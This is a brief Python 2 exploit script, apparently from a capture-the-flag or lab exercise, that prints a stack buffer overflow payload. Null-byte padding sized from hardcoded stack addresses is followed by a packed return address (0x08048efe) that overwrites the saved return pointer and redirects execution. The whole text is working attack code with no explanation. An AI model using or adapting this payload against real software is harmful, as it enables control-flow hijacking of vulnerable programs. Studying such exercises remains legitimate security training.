from struct import pack
ebp = 0xbffef478
buf = ebp - 8 - 4
return_addr = 0x08048efe

print '\x00' * (ebp - buf + 4) + pack("<I", return_addr)
